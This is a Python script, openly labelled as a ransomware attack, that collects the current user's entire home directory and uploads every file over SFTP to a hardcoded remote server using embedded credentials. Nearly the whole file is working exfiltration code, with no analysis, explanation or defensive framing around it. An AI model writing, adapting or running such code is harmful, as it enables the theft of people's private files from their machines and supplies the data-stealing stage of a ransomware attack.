import os
import sys
import getpass
from datetime import datetime
import paramiko 

# Function to get the user profile name
def get_profile_name():
    return getpass.getuser()

# Send files to the Ubuntu system via SCP
def send_files_to_ubuntu(target_directories, ubuntu_ip, username, password, port):
    # Setup the SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ubuntu_ip, username=username, password=password, port=port)

    logged_in_user = get_profile_name()

    # Create a date-time-based folder in /data
    now = datetime.now()
    folder_name = now.strftime("%Y-%m-%d_%H-%M-%S")
    tmp_dir = os.path.join('/presents', logged_in_user)
    dest_dir = os.path.join(tmp_dir, folder_name)

    try:
        # Create the remote directory on the Ubuntu system using SSH
        stdin, stdout, stderr = ssh.exec_command(f'mkdir -p {dest_dir}')
        stdout.channel.recv_exit_status()
        print(f"Remote directory created: {dest_dir}")
    except Exception as e:
        print(f"An error occurred while creating the remote directory: {e}")
        ssh.close()
        return

    # Use SFTP to transfer files from all target directories
    with paramiko.SFTPClient.from_transport(ssh.get_transport()) as sftp:
        for target_directory in target_directories:
            # Create a subdirectory in the remote folder corresponding to each target directory
            subfolder_name = os.path.basename(os.path.normpath(target_directory)) 
            remote_subfolder = os.path.join(dest_dir, subfolder_name)

            try:
                # Create the remote subdirectory
                sftp.mkdir(remote_subfolder)
                print(f"Directory {remote_subfolder} created on the remote server.")
            except Exception as e:
                print(f"Error creating directory {remote_subfolder}: {e}")
                continue  

            # Walk through the target directory and upload its contents
            for root, dirs, files in os.walk(target_directory):
                # Create any subdirectories in the remote location
                for dir in dirs:
                    local_dir = os.path.join(root, dir)
                    relative_dir = os.path.relpath(local_dir, target_directory)
                    remote_dir = os.path.join(remote_subfolder, relative_dir)
                    
                    try:
                        sftp.mkdir(remote_dir)
                        print(f"Directory {remote_dir} created on the remote server.")
                    except Exception as e:
                        print(f"Error creating directory {remote_dir}: {e}")
                
                # Upload files to their respective remote directories
                for file in files:
                    local_file = os.path.join(root, file)
                    relative_path = os.path.relpath(local_file, target_directory)
                    remote_file = os.path.join(remote_subfolder, relative_path)
                    sftp.put(local_file, remote_file)
                    print(f"File {local_file} sent to {remote_file}")

    ssh.close()

def ransomware_attack(target_directories, ubuntu_ip, username, password, port):
    send_files_to_ubuntu(target_directories, ubuntu_ip, username, password, port)

if __name__ == "__main__":
    target_directory = '/home/' + get_profile_name() + '/'
    target_directories = [target_directory]
    ubuntu_ip = '203.0.113.2'
    username = 'elliotalderson'
    password = 'elliotalderson'
    port = 22

    # Check each target directory before starting the attack
    valid_directories = [d for d in target_directories if os.path.isdir(d)]
    if not valid_directories:
        print("No valid directories found.")
        sys.exit(1)

    # Execute the malware attack for all valid target directories
    ransomware_attack(valid_directories, ubuntu_ip, username, password, port)
